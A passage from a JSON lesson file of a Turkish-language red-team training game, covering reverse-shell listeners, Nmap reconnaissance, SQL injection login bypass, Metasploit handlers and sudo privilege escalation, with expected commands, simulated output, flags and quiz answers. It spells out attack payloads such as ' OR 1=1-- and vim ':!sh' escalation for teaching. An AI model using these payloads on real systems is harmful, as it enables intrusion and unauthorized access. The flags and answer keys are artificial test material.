            "explanation": "Doğru! `reg query \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\"` komutu ezbere yazılan bir kod değil; reg query: Windows Kayıt Defteri (Registry) içindeki ayarları sorgulamak için kullanılan standart komuttur. HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run: Bilgisayar her açıldığında otomatik başlatılan programların kayıt yoludur. Saldırgan buraya zararlısını eklediğinde, sistem yeniden başlasa dahi kalıcı olur (Persistence)."
        }
    },
    {
        "id": "red-104",
        "track": "red",
        "title": "Temel Kodlama & Betik: Python & Ağ Soketleri",
        "level": "1. Temel Altyapı",
        "badge": "SCRIPTING & EXPLOIT DEV",
        "theory": "### Bir Saldırganın Silahları: Betik Dilleri\n\n💡 **GÜNLÜK HAYATTAN BENZETME:**\nKapıdaki nöbetçinin telsizini ödünç almak yerine, iki adet bakır tel ve pille kendi mini dinleme telsizinizi üretip portu dinlemeye almanızdır (Python Socket).\n\nHazır araçlar bir noktada güvenlik duvarlarına veya özel koruma mekanizmalarına takılır. Gerçek bir Red Teamer kendi aracını yazabilmeli veya var olan istismar kodunu düzenleyebilmelidir.\n\n* **Python:** Ağ soketleri oluşturma (`socket` modülü), HTTP isteklerini manipüle etme (`requests` kütüphanesi) ve hızlı PoC (Proof of Concept) yazımı için standart dildir.\n* **Bash:** Linux komut satırında ardışık komutları pipe (`|`) ile birbirine bağlayarak büyük veri yığınlarını anında filtreleme gücü sağlar.\n* **PowerShell:** Windows sistemlerin yönetim omurgasıdır. Doğrudan bellek üzerinde (.NET nesneleri kullanarak) çalıştığı için diske dosya yazmadan (fileless) saldırı simülasyonları yürütmekte kullanılır.",
        "mission": "Ters bağlantıları (reverse shell) karşılamak için 80 portunu dinleyen yerel Python soket dinleyicisini ('listener.py') başlatın.",
        "expectedCommand": "python3 listener.py",
        "acceptedCommands": [
            "python3 listener.py 80",
            "nc -lvnp 80",
            "python3 -m http.server 80"
        ],
        "hintExplanation": "<p><strong>python3:</strong> Python 3 yorumlayıcısını çalıştırır.</p>\n<p><strong>listener.py:</strong> Bilgisayarımızın ağ kartını dinlemeye alıp hedef sunucudan bize doğru gelecek ters kabuk (reverse shell) bağlantısını bekleyen hazır Python betiğimizdir. Bağlantı geldiğinde komut satırı açılır.</p>",
        "terminalSuccessOutput": "[+] Python3 soketi oluşturuldu (AF_INET, SOCK_STREAM)\n[+] 0.0.0.0:80 dinlemeye alındı (LISTENING)...\n[+] Bağlantı kabul edildi: 10.10.10.25:44321 -> Gelen Shell Doğrulandı!\n[FLAG] LFL{python_socket_automation_mastered}",
        "flag": "LFL{python_socket_automation_mastered}",
        "nextId": "red-201",
        "whyWeUse": "**Ezberlemeden Önce Mantığını Anla:** Gerçek bir siber güvenlik operasyonunda (1. Temel Altyapı) binlerce satırlık veriyi veya karmaşık sistem ayarlarını gözle kontrol etmek imkansızdır. Bu odada `python3 listener.py` komutunu kullanmamızın sebebi; **Temel Kodlama & Betik: Python & Ağ Soketleri** senaryosunda aradığımız kritik kanıtı, açık kapıyı veya güvenlik zafiyetini doğrudan işletim sistemi çekirdeğinden/loglarından hatasız şekilde çekmektir. python3: Python 3 yorumlayıcısını çalıştırır. listener.py: Bilgisayarımızın ağ kartını dinlemeye alıp hedef sunucudan bize doğru gelecek ters kabuk (reverse shell) bağlantısını bekleyen hazır Python betiğimizdir. Bağlantı geldiğinde komut satırı açılır.",
        "cmdAnatomy": [
            {
                "token": "python3",
                "role": "Ana Siber Araç / Komut",
                "desc": "Bu görevde çalıştırdığımız ana güvenlik veya sistem aracı (python3)."
            },
            {
                "token": "listener.py",
                "role": "Dosya / Klasör Yolu",
                "desc": "Üzerinde okuma, analiz veya işlem yapılacak hedef dosya/klasör (listener.py)."
            }
        ],
        "outputGuide": [
            {
                "snippet": "[+] Python3 soketi oluşturuldu (AF_INET, SOCK_STREAM)",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            },
            {
                "snippet": "[+] 0.0.0.0:80 dinlemeye alındı (LISTENING)...",
                "meaning": "Bu portun dışarıdan veya içeriden gelecek bağlantıları aktif olarak **dinlediğini (LISTEN)** belirtir."
            },
            {
                "snippet": "[+] Bağlantı kabul edildi: 10.10.10.25:44321 -> Gelen Shell Doğrulandı!",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            }
        ],
        "beginnerTerms": [
            {
                "term": "socket",
                "desc": "Bu odadaki (Temel Kodlama & Betik: Python & Ağ Soketleri) senaryoda kullanılan ve sistemin ilgili bileşenini/parametresini ifade eden teknik kavramdır."
            },
            {
                "term": "requests",
                "desc": "Bu odadaki (Temel Kodlama & Betik: Python & Ağ Soketleri) senaryoda kullanılan ve sistemin ilgili bileşenini/parametresini ifade eden teknik kavramdır."
            }
        ],
        "quickCheck": {
            "question": "Bu odada çalıştırdığımız `python3 listener.py` komutunun temel amacı nedir?",
            "options": [
                "Ters bağlantıları (reverse shell) karşılamak için 80 portunu dinleyen yerel Python soket dinleyicisini ('listener.py') başlatın.",
                "Bilgisayarın ekran kartı sürücüsünü güncellemek",
                "Sistemi tamamen silip yeniden başlatmak"
            ],
            "answer": 0,
            "explanation": "Doğru! `python3 listener.py` komutu ezbere yazılan bir kod değil; python3: Python 3 yorumlayıcısını çalıştırır. listener.py: Bilgisayarımızın ağ kartını dinlemeye alıp hedef sunucudan bize doğru gelecek ters kabuk (reverse shell) bağlantısını bekleyen hazır Python betiğimizdir. Bağlantı geldiğinde komut satırı açılır."
        }
    },
    {
        "id": "red-201",
        "track": "red",
        "title": "Keşif & Bilgi Toplama: Pasif OSINT & Aktif Nmap",
        "level": "2. Ofansif Güvenlik",
        "badge": "RECONNAISSANCE & OSINT",
        "theory": "### Hedefi Tanımadan Saldıramazsınız\n\n💡 **GÜNLÜK HAYATTAN BENZETME:**\nBir binayı soymadan önce binanın etrafındaki 65.535 pencerenin kollarına tek tek dokunup hangisinin aralık kaldığını ve hangi kilidin takılı olduğunu sessizce not almaktır (Nmap Taraması).\n\nKeşif aşaması sızma testinin en kritik evresidir; harcanan zamanın %70'i bu aşamada geçer.\n\n#### 1. Pasif Keşif (OSINT):\nHedef sistemle hiçbir doğrudan temas kurmadan kamuya açık kaynaklardan bilgi toplamaktır:\n* **Google Dorking:** Arama motoru filtreleri ile hassas dosya avı (`site:target.com filetype:pdf confidential`).\n* **Shodan:** İnternete bağlı tüm IoT cihazlarını, kameraları ve açık sunucuları port bazında indeksleyen arama motoru.\n\n#### 2. Aktif Keşif:\nHedefe doğrudan paket gönderilerek yapılan analizdir:\n* **Nmap Sürüm Taraması (`-sV`):** Açık portta hangi yazılımın hangi versiyonunun çalıştığını öğrenir.\n* **Varsayılan Scriptler (`-sC`):** Hedefte bilinen temel zafiyetleri ve konfigürasyon açıklarını otomatik yoklar.",
        "mission": "10.10.10.25 hedef IP'sine yönelik çalışan servis sürümlerini ve varsayılan güvenlik scriptlerini çalıştıran Nmap komutunu verin.",
        "expectedCommand": "nmap -sV -sC 10.10.10.25",
        "acceptedCommands": [
            "nmap -sV 10.10.10.25",
            "nmap -sV -sC -p- 10.10.10.25",
            "nmap -sC -sV 10.10.10.25",
            "nmap -A 10.10.10.25"
        ],
        "hintExplanation": "<p><strong>nmap:</strong> Dünyanın 1 numaralı ağ tarama ve port haritalama aracıdır.</p>\n<p><strong>-sV:</strong> 'Service Version' demektir. Açık portta hangi yazılımın (Apache mi, Jenkins mi, SSH mi?) çalıştığını ve tam sürümünü tespit eder.</p>\n<p><strong>-sC:</strong> Nmap ile birlikte gelen temel güvenlik ve bilgi toplama scriptlerini (NSE) otomatik devreye sokar.</p>\n<p><strong>10.10.10.25:</strong> Hedef sunucunun IP adresidir.</p>",
        "terminalSuccessOutput": "Starting Nmap 7.94 ( https://nmap.org )\nNmap scan report for target.lfl (10.10.10.25)\nHost is up (0.012s latency).\nPORT     STATE SERVICE     VERSION\n22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu\n80/tcp   open  http        Apache httpd 2.4.41\n8080/tcp open  http-proxy  Jenkins 2.235.1 (ZAFİYETLİ SÜRÜM CVE-2020-2160)\n[FLAG] LFL{nmap_deep_recon_reconnaissance}",
        "flag": "LFL{nmap_deep_recon_reconnaissance}",
        "nextId": "red-202",
        "whyWeUse": "**Ezberlemeden Önce Mantığını Anla:** Gerçek bir siber güvenlik operasyonunda (2. Ofansif Güvenlik) binlerce satırlık veriyi veya karmaşık sistem ayarlarını gözle kontrol etmek imkansızdır. Bu odada `nmap -sV -sC 10.10.10.25` komutunu kullanmamızın sebebi; **Keşif & Bilgi Toplama: Pasif OSINT & Aktif Nmap** senaryosunda aradığımız kritik kanıtı, açık kapıyı veya güvenlik zafiyetini doğrudan işletim sistemi çekirdeğinden/loglarından hatasız şekilde çekmektir. nmap: Dünyanın 1 numaralı ağ tarama ve port haritalama aracıdır. -sV: 'Service Version' demektir. Açık portta hangi yazılımın (Apache mi, Jenkins mi, SSH mi?) çalıştığını ve tam sürümünü tespit eder. -sC: Nmap ile birlikte gelen temel güvenlik ve bilgi toplama scriptlerini (NSE) otomatik devreye sokar. 10.10.10.25: Hedef sunucunun IP adresidir.",
        "cmdAnatomy": [
            {
                "token": "nmap",
                "role": "Ana Komut (Network Mapper)",
                "desc": "Siber güvenliğin en temel keşif aracıdır. Hedef bilgisayara paketler göndererek hangi portların açık olduğunu ve hangi servislerin çalıştığını tespit eder."
            },
            {
                "token": "-sV",
                "role": "Parametre (Service Version / Sürüm Tespiti)",
                "desc": "Sadece kapının açık olup olmadığına bakmaz; içeride çalışan programın tam adını ve versiyon numarasını (ör. Apache 2.4.52) öğrenir."
            },
            {
                "token": "-sC",
                "role": "Komut Parametresi (Flag)",
                "desc": "Komutun çalışma davranışını özelleştiren ve detaylı analiz modunu açan parametre (-sC)."
            },
            {
                "token": "10.10.10.25",
                "role": "Hedef IP / Ağ Adresi",
                "desc": "İşlemin uygulanacağı hedef makinenin veya ağın IP adresi (10.10.10.25)."
            }
        ],
        "outputGuide": [
            {
                "snippet": "Starting Nmap 7.94 ( https://nmap.org )",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            },
            {
                "snippet": "Nmap scan report for target.lfl (10.10.10.25)",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            },
            {
                "snippet": "Host is up (0.012s latency).",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            },
            {
                "snippet": "PORT     STATE SERVICE     VERSION",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            }
        ],
        "beginnerTerms": [
            {
                "term": "-sV",
                "desc": "Sadece kapının açık olup olmadığına bakmaz; içeride çalışan programın tam adını ve versiyon numarasını (ör. Apache 2.4.52) öğrenir."
            },
            {
                "term": "-sC",
                "desc": "Bu odadaki (Keşif & Bilgi Toplama: Pasif OSINT & Aktif Nmap) senaryoda kullanılan ve sistemin ilgili bileşenini/parametresini ifade eden teknik kavramdır."
            }
        ],
        "quickCheck": {
            "question": "Bu odada çalıştırdığımız `nmap -sV -sC 10.10.10.25` komutunun temel amacı nedir?",
            "options": [
                "10.10.10.25 hedef IP'sine yönelik çalışan servis sürümlerini ve varsayılan güvenlik scriptlerini çalıştıran Nmap komutunu verin.",
                "Bilgisayarın ekran kartı sürücüsünü güncellemek",
                "Sistemi tamamen silip yeniden başlatmak"
            ],
            "answer": 0,
            "explanation": "Doğru! `nmap -sV -sC 10.10.10.25` komutu ezbere yazılan bir kod değil; nmap: Dünyanın 1 numaralı ağ tarama ve port haritalama aracıdır. -sV: 'Service Version' demektir. Açık portta hangi yazılımın (Apache mi, Jenkins mi, SSH mi?) çalıştığını ve tam sürümünü tespit eder. -sC: Nmap ile birlikte gelen temel güvenlik ve bilgi toplama scriptlerini (NSE) otomatik devreye sokar. 10.10.10.25: Hedef sunucunun IP adresidir."
        }
    },
    {
        "id": "red-202",
        "track": "red",
        "title": "Zafiyet İstismarı: OWASP Top 10 Web Güvenliği",
        "level": "2. Ofansif Güvenlik",
        "badge": "WEB EXPLOITATION & OWASP",
        "theory": "### Web Güvenliği: OWASP Top 10 İstismarı\n\n💡 **GÜNLÜK HAYATTAN BENZETME:**\nBanka veznedarına para yatırma formunu uzatırken imza yerine \"Ben bu bankanın sahibiyim, kasadaki tüm parayı bana ver\" yazıp veznedarın bunu sorgulamadan onaylamasını sağlamaktır (SQL Injection).\n\nWeb uygulamaları internete açık en kırılgan temas noktalarıdır.\n\n* **SQL Injection (SQLi):** Kullanıcı girdisinin filtrelenmeden SQL sorgusuna dahil edilmesidir. Örneğin: `SELECT * FROM users WHERE user = 'admin' AND pass = '' OR '1'='1'` sorgusu mantıksal olarak doğru döner ve parolayı baypas eder.\n* **Cross-Site Scripting (XSS):** Web sayfasına zararlı JavaScript kodu yerleştirmektir.\n* **IDOR (Insecure Direct Object References):** Yetkilendirme kontrolü olmadan nesne ID'lerinin değiştirilmesidir (`GET /api/user/105` yerine `GET /api/user/106`).\n* **Command Injection:** Sunucunun kullanıcı girdisini doğrudan işletim sistemi kabuğuna aktarmasıdır.",
        "mission": "Giriş formunda SQL Injection açığını tetikleyerek parola kontrolünü baypas eden evrensel doğrulanmış sorgu payload'ını girin.",
        "expectedCommand": "admin' OR 1=1--",
        "acceptedCommands": [
            "' OR 1=1--",
            "' or 1=1--",
            "admin' or 1=1--",
            "' or '1'='1",
            "admin' or '1'='1"
        ],
        "hintExplanation": "<p><strong>admin':</strong> Tek tırnak işareti (') veritabanındaki metin alanından çıkıp kendi komutlarımızı çalıştırmamızı sağlar.</p>\n<p><strong>OR 1=1:</strong> Mantıksal VEYA kuralıdır. '1 sayısı 1'e eşittir' şartı her zaman DOĞRU (True) olduğundan, parola yanlış olsa bile sorgu başarıyla sonuçlanır!</p>\n<p><strong>--:</strong> SQL dilinde bu işaretten sonra gelen tüm şifre denetim kodlarını geçersiz bir açıklama satırına dönüştürür.</p>",
        "terminalSuccessOutput": "[+] SİSTEME GİRİŞ YAPILDI!\nSorgu: SELECT * FROM Users WHERE username='admin' OR 1=1--' AND pass='...'\nHoş Geldin Yönetici! Oturum Yetkisi: Level-0 System Admin\n[FLAG] LFL{owasp_sqli_auth_bypass_success}",
        "flag": "LFL{owasp_sqli_auth_bypass_success}",
        "nextId": "red-203",
        "whyWeUse": "**Ezberlemeden Önce Mantığını Anla:** Gerçek bir siber güvenlik operasyonunda (2. Ofansif Güvenlik) binlerce satırlık veriyi veya karmaşık sistem ayarlarını gözle kontrol etmek imkansızdır. Bu odada `admin' OR 1=1--` komutunu kullanmamızın sebebi; **Zafiyet İstismarı: OWASP Top 10 Web Güvenliği** senaryosunda aradığımız kritik kanıtı, açık kapıyı veya güvenlik zafiyetini doğrudan işletim sistemi çekirdeğinden/loglarından hatasız şekilde çekmektir. admin': Tek tırnak işareti (') veritabanındaki metin alanından çıkıp kendi komutlarımızı çalıştırmamızı sağlar. OR 1=1: Mantıksal VEYA kuralıdır. '1 sayısı 1'e eşittir' şartı her zaman DOĞRU (True) olduğundan, parola yanlış olsa bile sorgu başarıyla sonuçlanır! --: SQL dilinde bu işaretten sonra gelen tüm şifre denetim kodlarını geçersiz bir açıklama satırına dönüştürür.",
        "cmdAnatomy": [
            {
                "token": "admin",
                "role": "Ana Siber Araç / Komut",
                "desc": "Bu görevde çalıştırdığımız ana güvenlik veya sistem aracı (admin)."
            },
            {
                "token": "OR",
                "role": "Parametre Değeri / Hedef",
                "desc": "Komuta verilen arama kelimesi, kural veya hedef argüman (OR)."
            },
            {
                "token": "1=1--",
                "role": "Parametre Değeri / Hedef",
                "desc": "Komuta verilen arama kelimesi, kural veya hedef argüman (1=1--)."
            }
        ],
        "outputGuide": [
            {
                "snippet": "[+] SİSTEME GİRİŞ YAPILDI!",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            },
            {
                "snippet": "Sorgu: SELECT * FROM Users WHERE username='admin' OR 1=1--' AND pass='...'",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            },
            {
                "snippet": "Hoş Geldin Yönetici! Oturum Yetkisi: Level-0 System Admin",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            }
        ],
        "beginnerTerms": [
            {
                "term": "GET /api/user/105",
                "desc": "Bu odadaki (Zafiyet İstismarı: OWASP Top 10 Web Güvenliği) senaryoda kullanılan ve sistemin ilgili bileşenini/parametresini ifade eden teknik kavramdır."
            },
            {
                "term": "GET /api/user/106",
                "desc": "Bu odadaki (Zafiyet İstismarı: OWASP Top 10 Web Güvenliği) senaryoda kullanılan ve sistemin ilgili bileşenini/parametresini ifade eden teknik kavramdır."
            }
        ],
        "quickCheck": {
            "question": "Bu odada çalıştırdığımız `admin' OR 1=1--` komutunun temel amacı nedir?",
            "options": [
                "Giriş formunda SQL Injection açığını tetikleyerek parola kontrolünü baypas eden evrensel doğrulanmış sorgu payload'ını girin.",
                "Bilgisayarın ekran kartı sürücüsünü güncellemek",
                "Sistemi tamamen silip yeniden başlatmak"
            ],
            "answer": 0,
            "explanation": "Doğru! `admin' OR 1=1--` komutu ezbere yazılan bir kod değil; admin': Tek tırnak işareti (') veritabanındaki metin alanından çıkıp kendi komutlarımızı çalıştırmamızı sağlar. OR 1=1: Mantıksal VEYA kuralıdır. '1 sayısı 1'e eşittir' şartı her zaman DOĞRU (True) olduğundan, parola yanlış olsa bile sorgu başarıyla sonuçlanır! --: SQL dilinde bu işaretten sonra gelen tüm şifre denetim kodlarını geçersiz bir açıklama satırına dönüştürür."
        }
    },
    {
        "id": "red-203",
        "track": "red",
        "title": "Sistem İstismarı & Metasploit Framework",
        "level": "2. Ofansif Güvenlik",
        "badge": "METASPLOIT & EXPLOIT FRAMEWORK",
        "theory": "### Sistem İstismarı: Zafiyetleri Tetiklemek\n\n💡 **GÜNLÜK HAYATTAN BENZETME:**\nAçık bulduğunuz havalandırma borusundan içeri özel bir telsiz fırlatıp, içerideki sistemin otomatik olarak sizin telefonunuza gizli bir hat bağlamasını (Reverse Shell) sağlamaktır.\n\nBir zafiyet keşfedildikten sonra hedef sistem üzerinde kod çalıştırmak (RCE - Remote Code Execution) için istismar kodları (exploit) kullanılır.\n\n#### Metasploit Mimarisi:\n* **Exploit Modülleri:** Zafiyeti tetikleyerek bellekte açık kapı oluşturan kodlar.\n* **Payloads:** İstismar başarılı olduktan sonra hedefte çalışan kod parçası (Meterpreter vb.).\n* **Meterpreter:** Hedef sistemde diskte dosya bırakmadan doğrudan bellek içinde yaşayan gelişmiş bir sızma ajanıdır.",
        "mission": "Metasploit konsolunda dışarıdan gelecek ters bağlantıları (reverse shell) karşılayacak genel çoklu dinleyici modülünü seçin.",
        "expectedCommand": "use exploit/multi/handler",
        "acceptedCommands": [
            "use multi/handler",
            "handler",
            "msfconsole -x \"use exploit/multi/handler\""
        ],
        "hintExplanation": "<p><strong>use:</strong> Metasploit konsolu içinde kullanmak istediğimiz modülü aktif etme komutudur.</p>\n<p><strong>exploit/multi/handler:</strong> Hedefe fırlattığımız zararlı yazılım (payload) geriye doğru bizim IP adresimize bağlandığında onu karşılayan ve bize tam yetkili komut satırı (Meterpreter shell) açan genel dinleyici modülüdür.</p>",
        "terminalSuccessOutput": "[*] Using configured payload generic/shell_reverse_tcp\nmsf6 exploit(multi/handler) > set PAYLOAD windows/x64/meterpreter/reverse_tcp\nPAYLOAD => windows/x64/meterpreter/reverse_tcp\n[*] Started reverse TCP handler on 0.0.0.0:4444 \n[FLAG] LFL{metasploit_handler_ready_for_shell}",
        "flag": "LFL{metasploit_handler_ready_for_shell}",
        "nextId": "red-204",
        "whyWeUse": "**Ezberlemeden Önce Mantığını Anla:** Gerçek bir siber güvenlik operasyonunda (2. Ofansif Güvenlik) binlerce satırlık veriyi veya karmaşık sistem ayarlarını gözle kontrol etmek imkansızdır. Bu odada `use exploit/multi/handler` komutunu kullanmamızın sebebi; **Sistem İstismarı & Metasploit Framework** senaryosunda aradığımız kritik kanıtı, açık kapıyı veya güvenlik zafiyetini doğrudan işletim sistemi çekirdeğinden/loglarından hatasız şekilde çekmektir. use: Metasploit konsolu içinde kullanmak istediğimiz modülü aktif etme komutudur. exploit/multi/handler: Hedefe fırlattığımız zararlı yazılım (payload) geriye doğru bizim IP adresimize bağlandığında onu karşılayan ve bize tam yetkili komut satırı (Meterpreter shell) açan genel dinleyici modülüdür.",
        "cmdAnatomy": [
            {
                "token": "use",
                "role": "Ana Siber Araç / Komut",
                "desc": "Bu görevde çalıştırdığımız ana güvenlik veya sistem aracı (use)."
            },
            {
                "token": "exploit/multi/handler",
                "role": "Parametre Değeri / Hedef",
                "desc": "Komuta verilen arama kelimesi, kural veya hedef argüman (exploit/multi/handler)."
            }
        ],
        "outputGuide": [
            {
                "snippet": "[*] Using configured payload generic/shell_reverse_tcp",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            },
            {
                "snippet": "msf6 exploit(multi/handler) > set PAYLOAD windows/x64/meterpreter/revers...",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            },
            {
                "snippet": "PAYLOAD => windows/x64/meterpreter/reverse_tcp",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            },
            {
                "snippet": "[*] Started reverse TCP handler on 0.0.0.0:4444",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            }
        ],
        "beginnerTerms": [
            {
                "term": "use",
                "desc": "Sistem İstismarı & Metasploit Framework görevinde kullanılan temel siber güvenlik ve sistem analiz aracıdır."
            }
        ],
        "quickCheck": {
            "question": "Bu odada çalıştırdığımız `use exploit/multi/handler` komutunun temel amacı nedir?",
            "options": [
                "Metasploit konsolunda dışarıdan gelecek ters bağlantıları (reverse shell) karşılayacak genel çoklu dinleyici modülünü seçin.",
                "Bilgisayarın ekran kartı sürücüsünü güncellemek",
                "Sistemi tamamen silip yeniden başlatmak"
            ],
            "answer": 0,
            "explanation": "Doğru! `use exploit/multi/handler` komutu ezbere yazılan bir kod değil; use: Metasploit konsolu içinde kullanmak istediğimiz modülü aktif etme komutudur. exploit/multi/handler: Hedefe fırlattığımız zararlı yazılım (payload) geriye doğru bizim IP adresimize bağlandığında onu karşılayan ve bize tam yetkili komut satırı (Meterpreter shell) açan genel dinleyici modülüdür."
        }
    },
    {
        "id": "red-204",
        "track": "red",
        "title": "Yetki Yükseltme (Privilege Escalation)",
        "level": "2. Ofansif Güvenlik",
        "badge": "PRIVESC & POST EXPLOITATION",
        "theory": "### Normal Kullanıcıdan Root/SYSTEM Yetkilerine\n\n💡 **GÜNLÜK HAYATTAN BENZETME:**\nSıradan bir ziyaretçi kimliğiyle girip, yerdeki unutulmuş anahtarla genel müdür odasını açmaktır (Privilege Escalation).\n\nBir sisteme ilk girdiğinizde genellikle `www-data` veya yetkisiz standart bir kullanıcı hesabı elde edersiniz. Tam kontrol için işletim sistemi izin basamaklarını tırmanmanız gerekir.\n\n#### 1. Linux PrivEsc Vektörleri:\n* **Sudo İzinleri (`sudo -l`):** Kullanıcının parola girmeden çalıştırabileceği root komutları. Örneğin `sudo vim` izni varsa `:!sh` yazılarak root kabuğu alınır.\n* **Zafiyetli Kernel:** Çekirdek bellek sızıntıları (Dirty COW, PwnKit).\n* **Yetkisiz Yazılabilir Servisler:** Başlangıçta çalışan servis dosyalarına yazma hakkı.",
        "mission": "Linux kabuğunda kullanıcının şifresiz sudo çalıştırma yetkilerini listeleyen denetim komutunu çalıştırın.",
        "expectedCommand": "sudo -l",
        "acceptedCommands": [
            "sudo --list",
            "sudo -l -U cadet"
        ],
        "hintExplanation": "<p><strong>sudo:</strong> Bir komutu en yetkili sistem yöneticisi (root) olarak çalıştırma emridir.</p>\n<p><strong>-l:</strong> 'List' demektir. Mevcut kullanıcının şifre girmeden (NOPASSWD) hangi root komutlarını çalıştırabileceğini listeler. Eğer listede Python veya vim varsa, tek satırda sistem yöneticisi olunur!</p>",
        "terminalSuccessOutput": "Matching Defaults entries for cadet on lfl-terminal:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:...\nUser cadet may run the following commands on lfl-terminal:\n    (root) NOPASSWD: /usr/bin/python3 /opt/automation/backup.py\n[CRITICAL] Python scripti üzerinden yetki yükseltme kapısı açık!\n[FLAG] LFL{sudo_privesc_vector_analyzed}",
        "flag": "LFL{sudo_privesc_vector_analyzed}",
        "nextId": "red-301",
        "whyWeUse": "**Ezberlemeden Önce Mantığını Anla:** Gerçek bir siber güvenlik operasyonunda (2. Ofansif Güvenlik) binlerce satırlık veriyi veya karmaşık sistem ayarlarını gözle kontrol etmek imkansızdır. Bu odada `sudo -l` komutunu kullanmamızın sebebi; **Yetki Yükseltme (Privilege Escalation)** senaryosunda aradığımız kritik kanıtı, açık kapıyı veya güvenlik zafiyetini doğrudan işletim sistemi çekirdeğinden/loglarından hatasız şekilde çekmektir. sudo: Bir komutu en yetkili sistem yöneticisi (root) olarak çalıştırma emridir. -l: 'List' demektir. Mevcut kullanıcının şifre girmeden (NOPASSWD) hangi root komutlarını çalıştırabileceğini listeler. Eğer listede Python veya vim varsa, tek satırda sistem yöneticisi olunur!",
        "cmdAnatomy": [
            {
                "token": "sudo",
                "role": "Ana Komut (Superuser Do)",
                "desc": "Komutu en yetkili sistem yöneticisi (root) haklarıyla çalıştırır."
            },
            {
                "token": "-l",
                "role": "Komut Parametresi (Flag)",
                "desc": "Komutun çalışma davranışını özelleştiren ve detaylı analiz modunu açan parametre (-l)."
            }
        ],
        "outputGuide": [
            {
                "snippet": "Matching Defaults entries for cadet on lfl-terminal:",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            },
            {
                "snippet": "env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:...",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            },
            {
                "snippet": "User cadet may run the following commands on lfl-terminal:",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            },
            {
                "snippet": "(root) NOPASSWD: /usr/bin/python3 /opt/automation/backup.py",
                "meaning": "Sistemdeki en üst düzey yönetici (**root**) yetkisine ulaşıldığını veya bu dosyanın root yetkisiyle çalıştığını kanıtlar."
            }
        ],
        "beginnerTerms": [
            {
                "term": "www-data",
                "desc": "Bu odadaki (Yetki Yükseltme (Privilege Escalation)) senaryoda kullanılan ve sistemin ilgili bileşenini/parametresini ifade eden teknik kavramdır."
            },
            {
                "term": "sudo vim",
                "desc": "Bu odadaki (Yetki Yükseltme (Privilege Escalation)) senaryoda kullanılan ve sistemin ilgili bileşenini/parametresini ifade eden teknik kavramdır."
            },
            {
                "term": ":!sh",
                "desc": "Bu odadaki (Yetki Yükseltme (Privilege Escalation)) senaryoda kullanılan ve sistemin ilgili bileşenini/parametresini ifade eden teknik kavramdır."
            }
        ],
        "quickCheck": {
            "question": "Bu odada çalıştırdığımız `sudo -l` komutunun temel amacı nedir?",
            "options": [
                "Linux kabuğunda kullanıcının şifresiz sudo çalıştırma yetkilerini listeleyen denetim",
                "Bilgisayarın ekran kartı sürücüsünü güncellemek",
                "Sistemi tamamen silip yeniden başlatmak"
            ],
            "answer": 0,
            "explanation": "Doğru! `sudo -l` komutu ezbere yazılan bir kod değil; sudo: Bir komutu en yetkili sistem yöneticisi (root) olarak çalıştırma emridir. -l: 'List' demektir. Mevcut kullanıcının şifre girmeden (NOPASSWD) hangi root komutlarını çalıştırabileceğini listeler. Eğer listede Python veya vim varsa, tek satırda sistem yöneticisi olunur!"
        }
    },
    {
        "id": "red-301",
        "track": "red",
        "title": "Active Directory Güvenliği & Kerberoasting",
        "level": "3. Red Team Yetkinlikleri",
        "badge": "ACTIVE DIRECTORY & KERBEROS",
        "theory": "### Kurumsal Ağların %90'ı: Active Directory\n\n💡 **GÜNLÜK HAYATTAN BENZETME:**\nLunapark biletçisinden bilet isteyip, o biletin arkasındaki gizli damgayı eve götürüp büyüteçle çözmeye çalışmaktır (Kerberoasting).\n\nKlasik penetrasyon testinde amaç açığı bulup raporlamaktır; Red Team'de ise hedef Domain Controller ve kurumun en değerli varlıklarıdır.\n\n#### 1. Kerberoasting Saldırısı:\nActive Directory'de servis hesaplarına (SQL Server, IIS vb.) SPN (Service Principal Name) atanır. Herhangi bir domain kullanıcısı bu servis için etki alanı denetleyicisinden (DC) bir **TGS (Ticket Granting Service)** bileti isteyebilir. Bu bilet servis hesabının NTLM parolasıyla şifrelenmiştir.\n* Saldırgan bileti belleğe indirir.\n* Kendi bilgisayarına aktararak sözlük saldırısıyla (Hashcat) offline olarak şifresini çözer.",
